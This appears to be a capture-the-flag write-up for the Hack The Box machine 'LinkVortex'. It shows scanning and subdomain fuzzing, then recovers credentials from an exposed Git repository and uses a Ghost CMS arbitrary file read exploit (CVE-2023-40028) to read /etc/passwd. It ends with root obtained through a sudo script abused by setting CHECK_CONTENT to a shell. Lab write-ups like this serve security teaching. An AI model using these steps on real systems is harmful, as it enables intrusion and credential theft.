
<img src="Imgs/image.png" alt="error loading image">


The first step is to start with an Nmap scan.

```jsx
─(kali㉿kali)-[~]
└─$ nmap 10.10.11.47  
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 10:50 EST
Nmap scan report for 10.10.11.47
Host is up (1.6s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 8.85 seconds
```
To get a complete overview, we use a default script scan and a service version scan.


```jsx
──(kali㉿kali)-[~]
└─$ nmap -sC -sV -A 10.10.11.47   
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-12 10:52 EST
Nmap scan report for 10.10.11.47
Host is up (0.73s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: Did not follow redirect to http://linkvortex.htb/
|_http-server-header: Apache
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=2/12%OT=22%CT=1%CU=43535%PV=Y%DS=2%DC=T%G=Y%TM=67AC
OS:C41C%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI=Z%TS=D)SEQ(S
OS:P=108%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=108%GCD=1%ISR=10D%TI=Z%CI
OS:=Z%II=I%TS=B)OPS(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST
OS:11NW7%O5=M53AST11NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=
OS:FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T
OS:=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R
OS:%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=
OS:40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0
OS:%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R
OS:=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT       ADDRESS
1   711.68 ms 10.10.16.1
2   357.21 ms 10.10.11.47

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 90.68 seconds
```                                          
To ensure our system resolves `linkvortex.htb` to `10.10.11.47`, we need to verify the hostname resolution.

```jsx
──(kali㉿kali)-[~]
└─$ cat nano /etc/hosts
cat: nano: No such file or directory
127.0.0.1 localhost
127.0.1.1 kali

10.10.11.47 linkvortex.htb
```
To find hidden directories and files, we use Dirsearch. We found a couple of files.

```jsx
┌──(kali㉿kali)-[~]
└─$ dirsearch -u "http://linkvortex.htb" -t 50 -i 200
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/reports/http_linkvortex.htb/_25-02-12_11-04-26.txt

Target: http://linkvortex.htb/

[11:04:26] Starting: 
[11:06:16] 200 -   15KB - /favicon.ico                                      
[11:06:38] 200 -    1KB - /LICENSE                                          
[11:07:13] 200 -  103B  - /robots.txt                                       
[11:07:18] 200 -  259B  - /sitemap.xml                                      
                                                                             
Task Completed                                             
```           


In `robots.txt`, we found:

```jsx
User-agent: *
Sitemap: http://linkvortex.htb/sitemap.xml
Disallow: /ghost/
Disallow: /p/
Disallow: /email/
Disallow: /r/
```

At `/ghost`, we found a signup page, but we don't have any credentials. So, we proceed with subdomain enumeration.

[Here is wordlist](https://github.com/theMiddleBlue/DNSenum/blob/master/wordlist/subdomains-top1mil-20000.txt)

```jsx
──(kali㉿kali)-[~/Downloads]
└─$ wfuzz -c -w subdomains-top1mil-20000.txt  -H "Host: FUZZ.linkvortex.htb" --sc 200 http://linkvortex.htb/ 

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://linkvortex.htb/
Total requests: 20000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                     
=====================================================================

000000019:   200        115 L    255 W      2538 Ch     "dev"                                                                                       

```
First, update the `/etc/hosts` file with the new domain `dev.linkvortex.htb`.

```jsx
─$ sudo cat  /etc/hosts                                   
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters

10.10.11.47 linkvortex.htb
10.10.11.47 dev.linkvortex.htb
```
Now, we use `git-dumper` to find all GitHub repositories. Under `admin`, I found a password for a user.

```jsx
──(venv)─(kali㉿kali)-[~]
└─$ cd /home/kali/linkvortex.htb/ghost/core/test/regression/api/admin/                      
                                                                                                                                                                                          
┌──(venv)─(kali㉿kali)-[~/…/test/regression/api/admin]
└─$ sudo nano authentication.test.js                                  
                                
```
```jsx
 it('complete setup', async function () {
            const email = 'test@example.com';
            const password = 'OctopiFociPilfer45';

            const requestMock = nock('https://api.github.com')
                .get('/repos/tryghost/dawn/zipball')
                .query(true)
                .replyWithFile(200, fixtureManager.getPathForFixture('themes/valid.zip'));

            await agent
```
In the Git log, we found an email domain: `@linkvortex.com`.

```jsx                                                                                                   
┌──(venv)─(kali㉿kali)-[~]
└─$ cd /home/kali/linkvortex.htb/.git/logs
                                                                                                                                                                                       
┌──(venv)─(kali㉿kali)-[~/linkvortex.htb/.git/logs]
└─$ cat HEAD                              
0000000000000000000000000000000000000000 299cdb4387763f850887275a716153e84793077d root <dev@linkvortex.htb> 1730322603 +0000    clone: from https://github.com/TryGhost/Ghost.git
```
We have credentials:  

```
admin@linkvortex.htb::OctopiFociPilfer45
```

Login URL: [http://linkvortex.htb/ghost/#/signin](http://linkvortex.htb/ghost/#/signin)  

Once logged in, under the settings, we found the version of Ghost CMS running, which is vulnerable.

```jsx
Version: 5.58.0
Environment: production
Database: mysql8
Mail: SMTP
```

We found an exploit here:  

[Exploit GitHub](https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028/blob/master/CVE-2023-40028)  

Now, we run the exploit as shown below, and we are able to read files.

```jsx
┌──(venv)─(kali㉿kali)-[~/tool_pentest]
└─$ ./exploit.sh  -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb/                        
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /etc/passwd
File content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin

```
We are particularly interested in the endpoint mentioned in `Dockerfile.ghost`.

```jsx
# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```

Inside `/var/lib/ghost/config.production.json`, we found a username and password.  

Using these credentials, we logged in via SSH and successfully obtained the user flag. 

```jsx
 "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
```
And we found the user flag here! 

```jsx
┌──(venv)─(kali㉿kali)-[~/linkvortex.htb]
└─$ ssh bob@linkvortex.htb
bob@linkvortex.htb's password: 

Last login: Wed Feb 12 15:32:47 2025 from 10.10.16.36
bob@linkvortex:~$ ls
furious5.png  hoge.txt  shadow  user.txt
bob@linkvortex:~$ cat user.txt 
************3e5ce5f69ec942e47fdc
bob@linkvortex:~$ 

```
For privilege escalation, we run `sudo -l` to check the commands we can execute with sudo permissions.

```jsx
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```
Bob can run `/opt/ghost/clean_symlink.sh` as root using `/usr/bin/bash` without needing a password.  

The wildcard `*.png` suggests that the script is designed to process PNG files.  

When we open the file, we find the following:

```jsx
```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```

### **Symbolic Link Exploitation:**  
We can create a symbolic link pointing to a root-owned file (e.g., `/root/.bashrc`).  
Since the script moves the symlink to the quarantine directory, it might change ownership if misconfigured.  

### **Environment Variable Exploitation (`CHECK_CONTENT`):**  
If `CHECK_CONTENT` is executed without proper sanitization, we can inject arbitrary commands.  

### **Privilege Escalation:**  
- The script blindly executes `$CHECK_CONTENT`, allowing arbitrary command execution.  
- Bob has `sudo` privileges to run this script **without a password**, making it possible to execute commands as **root**.  

This ultimately grants us **root access**!

```jsx

bob@linkvortex:~$ ln -s /bin/bash exploit.png
bob@linkvortex:~$ 
bob@linkvortex:~$ export CHECK_CONTENT="/bin/bash"
bob@linkvortex:~$ 
bob@linkvortex:~$ sudo /usr/bin/bash /opt/ghost/clean_symlink.sh exploit.png
Link found [ exploit.png ] , moving it to quarantine
root@linkvortex:/home/bob# 
root@linkvortex:/home/bob# cd ..
root@linkvortex:/home# cd ..
root@linkvortex:/# cd root
root@linkvortex:~# cat root.txt 
************31738aa9b53bb8afeb00
root@linkvortex:~# 

```
